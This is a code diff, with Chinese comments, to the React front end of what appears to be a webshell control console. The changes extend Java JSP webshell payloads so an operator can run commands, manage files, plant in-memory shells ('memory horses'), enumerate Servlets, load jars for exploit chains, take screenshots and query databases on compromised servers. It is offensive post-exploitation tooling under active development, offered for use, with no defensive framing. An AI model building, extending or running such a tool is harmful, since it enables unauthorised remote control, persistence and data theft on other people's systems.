@@ -202,7 +202,7 @@ export default function WebshellConsole() {
                 </select>
               </div>
               {isJavaCarrier(edit) && (
-                <div className="text-[11px] text-muted-foreground">Java 载荷：目标需 JRE 8+，支持命令执行、基础信息、文件管理、内存马、进程/网络/数据库（数据库需目标 classpath 自带 JDBC 驱动）。</div>
+                <div className="text-[11px] text-muted-foreground">Java 载荷：目标需 JRE 8+，只下发字节码、不在目标落脚本文件；命令执行、文件管理、内存马、进程/网络/数据库、Servlet 枚举、Jar 加载、截屏都可用（数据库可指定目标机上的驱动 jar）。</div>
               )}
               <Input placeholder='附加头 JSON（Gate/UA，如 {"X-Gate":"v"}）' value={edit.headers || ""} onChange={(e) => setEdit({ ...edit, headers: e.target.value })} />
               <textarea className="h-16 w-full rounded border bg-transparent p-2 text-xs" placeholder="备注" value={edit.note || ""} onChange={(e) => setEdit({ ...edit, note: e.target.value })} />
@@ -292,7 +292,7 @@ function GenerateDialog({ onClose }: { onClose: () => void }) {
             </select>
             <div className="col-span-2 flex items-center text-[11px] text-muted-foreground">
               {carrier === "java"
-                ? "Java 载荷：生成 JSP 载体，连上后由服务端下发字节码执行（命令/信息/文件管理/内存马/进程/网络/数据库）"
+                ? "Java 载荷：生成 JSP 载体，连上后由服务端下发字节码执行（命令/文件/内存马/进程/网络/数据库/Servlet/Jar）"
                 : "脚本载体：生成常规 webshell，支持全部插件能力"}
             </div>
           </div>
@@ -349,11 +349,11 @@ function GenerateDialog({ onClose }: { onClose: () => void }) {
 type PanelKey = "info" | "files" | "cmd" | "db" | "net" | "proc" | "memshell" | "servlet" | "jar" | "shot" | "phptool" | "note";
 
 function SessionWindow({ target, onClose }: { target: WSTarget; onClose: () => void }) {
-  // Java 载体支持 exec/info/文件管理；数据库、网络、进程、内存马这几项在载荷里
-  // 用 JDK 自带 API 重写过等价实现（不依赖目标端解释器），所以也能开。
-  // 仍属脚本载体专属的：zip/unzip、Servlet 枚举、Jar 加载、远程屏幕、PHP 工具。
+  // Java 载体支持 exec/info/文件管理；数据库、网络、进程、内存马、Servlet 枚举、
+  // Jar 加载、远程屏幕这几项在载荷里用 JDK 自带 API 重写过等价实现（不依赖目标端
+  // 解释器），所以也能开。仍属脚本载体专属的：zip/unzip、PHP 工具。
   const javaCarrier = isJavaCarrier(target);
-  const ops = javaCarrier ? ["db", "net", "proc", "memshell"] : extOps(target.script_type);
+  const ops = javaCarrier ? ["db", "net", "proc", "memshell", "servlet", "jar", "shot"] : extOps(target.script_type);
   const panels: { key: PanelKey; label: string; icon: React.ReactNode }[] = [
     { key: "info", label: "基础信息", icon: <InfoIcon className="size-4" /> },
     { key: "files", label: "文件管理", icon: <FolderIcon className="size-4" /> },
@@ -736,7 +736,7 @@ function fmtSize(n: number) {
 // ---------- 数据库 ----------
 
 function DBPanel({ target }: { target: WSTarget }) {
-  const [cfg, setCfg] = React.useState({ db_type: "mysql", host: "127.0.0.1", port: "3306", user: "root", pass: "", db: "" });
+  const [cfg, setCfg] = React.useState({ db_type: "mysql", host: "127.0.0.1", port: "3306", user: "root", pass: "", db: "", jar_path: "" });
   const [sql, setSql] = React.useState("SELECT 1");
   const [result, setResult] = React.useState<{ columns: string[]; rows: Record<string, unknown>[]; affected?: number } | null>(null);
   const [err, setErr] = React.useState("");
@@ -764,7 +764,7 @@ function DBPanel({ target }: { target: WSTarget }) {
       <div className="grid grid-cols-3 gap-1 text-xs md:grid-cols-6">
         <select className="rounded border border-zinc-700 bg-zinc-800 p-1 text-zinc-200" value={cfg.db_type} onChange={(e) => { const t = e.target.value; setCfg({ ...cfg, db_type: t, port: t === "mysql" ? "3306" : t === "pgsql" ? "5432" : cfg.port }); }}>
           <option value="mysql">mysql</option><option value="pgsql">pgsql</option>
-          {target.script_type === "php" && <option value="sqlite">sqlite</option>}
+          {(target.script_type === "php" || isJavaCarrier(target)) && <option value="sqlite">sqlite</option>}
         </select>
         <DInput placeholder="host" value={cfg.host} onChange={(e) => setCfg({ ...cfg, host: e.target.value })} />
         <DInput placeholder="port" value={cfg.port} onChange={(e) => setCfg({ ...cfg, port: e.target.value })} />
@@ -772,6 +772,13 @@ function DBPanel({ target }: { target: WSTarget }) {
         <DInput placeholder="pass" type="password" value={cfg.pass} onChange={(e) => setCfg({ ...cfg, pass: e.target.value })} />
         <DInput placeholder={cfg.db_type === "sqlite" ? "db 文件路径" : "database"} value={cfg.db} onChange={(e) => setCfg({ ...cfg, db: e.target.value })} />
       </div>
+      {isJavaCarrier(target) && (
+        <DInput
+          placeholder="驱动 jar 路径（目标机上的文件，多个用逗号分隔；目标 classpath 没驱动时用）"
+          value={cfg.jar_path}
+          onChange={(e) => setCfg({ ...cfg, jar_path: e.target.value })}
+        />
+      )}
       <div className="flex gap-1">
         {["SHOW DATABASES", "SHOW TABLES", "SELECT version()", "SELECT user()"].map((s) => (
           <button key={s} className="rounded border border-zinc-700 bg-zinc-800 px-1.5 py-0.5 font-mono text-[10px] text-zinc-400 hover:text-zinc-100" onClick={() => setSql(s)}>{s}</button>
@@ -976,7 +983,11 @@ function JarPanel({ target }: { target: WSTarget }) {
   };
   return (
     <div className="space-y-2 text-sm">
-      <div className="text-xs text-zinc-500">上传 jar 到目标机临时目录并 URLClassLoader 装载（配合内存马/利用链）。</div>
+      <div className="text-xs text-zinc-500">
+        上传 jar 到目标机临时目录并 URLClassLoader 装载（配合内存马/利用链）。
+        Java 载体会回报装载路径与包里的 JDBC 驱动，把路径填到「数据库」面板的 jar 路径即可直连；
+        驱动包缺依赖时（如 sqlite 需要 slf4j）把依赖包也传一次，两个路径用逗号拼起来用。
+      </div>
       <DBtn onClick={upload} disabled={busy}><FolderUpIcon className="size-3.5" /> 选择 jar 上传加载</DBtn>
       <DPre>{out || "（结果）"}</DPre>
     </div>
